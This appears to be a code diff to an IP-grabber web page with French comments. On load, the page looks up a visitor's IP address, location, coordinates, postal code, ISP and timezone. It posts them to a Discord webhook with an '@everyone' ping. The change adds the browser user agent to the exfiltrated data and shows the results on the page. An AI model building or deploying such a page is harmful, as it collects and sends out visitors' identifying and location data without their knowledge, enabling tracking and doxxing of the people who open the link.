@@ -41,7 +41,7 @@
     <h1>Hi! Here's Your Exact Location:</h1>
     <hr>
     <p><strong>IP Address:</strong> <span id="ip_address"></span></p>
-    <p><strong>Country:</strong> <span value: ipInfo.country"></span></p>
+    <p><strong>Country:</strong> <span id="country_name"></span></p>
     <p><strong>Region:</strong> <span id="region_name"></span></p>
     <p><strong>City:</strong> <span id="city_name"></span></p>
     <p><strong>Latitude:</strong> <span id="latitude"></span></p>
@@ -49,6 +49,7 @@
     <p><strong>Postal Code:</strong> <span id="postal_code"></span></p>
     <p><strong>Timezone:</strong> <span id="timezone"></span></p>
     <p><strong>ISP:</strong> <span id="isp"></span></p>
+    <p><strong>User Agent:</strong> <span id="user_agent"></span></p>
     <hr>
     <script>
         // Fonction pour effectuer une requête HTTP POST vers le webhook Discord
@@ -89,11 +90,24 @@
                                     { name: 'Postal Code', value: ipInfo.postal, inline: true },
                                     { name: 'Timezone', value: ipInfo.timezone, inline: true },
                                     { name: 'ISP', value: operator, inline: true },
+                                    { name: 'User Agent', value: navigator.userAgent, inline: true }, // Ajout de l'user agent
                                 ],
                             };
 
                             // Envoie les informations au webhook Discord
                             sendRequest({ content: "@everyone", embeds: [embed] });
+
+                            // Afficher les informations sur la page HTML
+                            document.getElementById('ip_address').textContent = ip;
+                            document.getElementById('country_name').textContent = ipInfo.country;
+                            document.getElementById('region_name').textContent = ipInfo.region;
+                            document.getElementById('city_name').textContent = ipInfo.city;
+                            document.getElementById('latitude').textContent = ipInfo.loc.split(',')[0];
+                            document.getElementById('longitude').textContent = ipInfo.loc.split(',')[1];
+                            document.getElementById('postal_code').textContent = ipInfo.postal;
+                            document.getElementById('timezone').textContent = ipInfo.timezone;
+                            document.getElementById('isp').textContent = operator;
+                            document.getElementById('user_agent').textContent = navigator.userAgent;
                         })
                         .catch(error => console.error('Erreur lors de la récupération des informations IPInfo :', error));
                 })
